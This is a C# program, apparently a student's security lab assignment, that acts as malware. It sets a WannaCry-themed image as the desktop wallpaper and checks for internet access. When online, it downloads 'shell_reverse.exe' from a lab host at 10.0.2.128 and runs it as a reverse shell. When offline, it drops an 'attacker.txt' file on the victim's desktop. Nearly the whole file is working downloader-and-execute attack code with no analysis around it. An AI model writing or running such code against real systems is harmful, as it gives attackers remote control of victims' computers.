using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading;


namespace Lab2_B3
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("18521379 - Bùi Xuân Thái");
            changeBackground();
            CheckInternet();
        }

        //Setup các biến để phục vụ thay đổi màn hình
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern Int32 SystemParametersInfo(UInt32 uAction, UInt32 uParam, String lpvParam, UInt32 fuWinini);
        private static UInt32 SPI_SETDESKWALLPAPER = 20;
        private static UInt32 SPIF_SENDWININICHANGE = 0x1;
        private static UInt32 SPIF_UPDATEINIFILE = 0x2;

        /// <summary>
        /// Hàm có chức năng thay đổi hình nền máy tính
        /// </summary>
        static void changeBackground()
        {
            //Tạo biến đường dẫn file hình ảnh
            string path = AppDomain.CurrentDomain.BaseDirectory + "\\desktop.jpg";

            try
            {
                if (!File.Exists(path))  //Kiểm tra file đã có hay chưa
                {
                    using (WebClient client = new WebClient()) //Nếu chưa có thì tải ảnh về máy
                    {
                        client.DownloadFile("https://cdn.tgdd.vn/Files/2017/05/14/982411/viruswannacry-_2030x1186-800-resize.jpg", path);
                    }
                }
            }
            catch { }

            SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, path, SPIF_SENDWININICHANGE | SPIF_UPDATEINIFILE);  //Thực hiện đổi hình nền desktop
        }

        /// <summary>
        /// Hàm có chức năng tải và thực thi reverse shell
        /// </summary>
        static void Reverse_Shell()
        {
            try
            {
                //Tạo đường dẫn file Reverse Shell
                string pathReverseShell = @"C:\Users\XUAN THAI\Desktop\ReverseShell.exe";

                Uri uri = new Uri("http://10.0.2.128/shell_reverse.exe");

                if (!File.Exists(pathReverseShell)) //Kiểm tra file Reverse Shell đã có hay chưa
                {
                    using (WebClient client = new WebClient())
                    {
                        //Tải File Reverse Shell

                        client.DownloadFile("http://10.0.2.128/shell_reverse.exe", pathReverseShell);
                    }
                }

                //Thread a = new Thread()
                System.Diagnostics.Process.Start(pathReverseShell);
            }
            catch
            {
                Console.WriteLine("Error!!!!");
            }
        }


        /// <summary>
        /// Hàm có chức năng tạo tập tin ở thư mục desktop của máy tính
        /// </summary>
        static void CreateFile()
        {
            //Lấy đường dẫn đến thư mục desktop hiện hành của máy nạn nhân
            string filepath = Environment.GetFolderPath(System.Environment.SpecialFolder.DesktopDirectory);

            filepath += "\\attacker.txt"; //Thêm tên tập tin vào đường dẫn desktop

            if (!File.Exists(filepath)) //Kiểm tra tập tin đã có hay chưa
            {
                // chưa có thì tạo tập tin 
                using (StreamWriter sw = File.CreateText(filepath))
                {
                    //ghi nội dung tập tin
                    sw.WriteLine("Hello everyone. Today i feel so good !!!");
                }
            }
            else
            {
                //đã có thì ghi tiếp nội dung vào tập tin
                using (StreamWriter sw = File.AppendText(filepath))
                {
                    //ghi nội dung tập tin
                    sw.WriteLine("Hello everyone. Today i feel so good !!!");
                }
            }
        }

        /// <summary>
        /// Hàm check kết nối internet
        /// </summary>
        static void CheckInternet()
        {
            try
            {
                HttpWebRequest request = (HttpWebRequest)HttpWebRequest.Create("http://example.com/");
                request.Method = "GET";

                HttpWebResponse response = (HttpWebResponse)request.GetResponse();

                //kiểm tra trạng thái của internet
                if ((int)response.StatusCode >= 200 && (int)response.StatusCode < 300)
                {
                    response.Close();
                    Reverse_Shell();
                }
                else
                {
                    CreateFile();
                }

                //Close stream
                response.Close();
            }
            catch
            {
                CreateFile();
            }
        }
    }


}
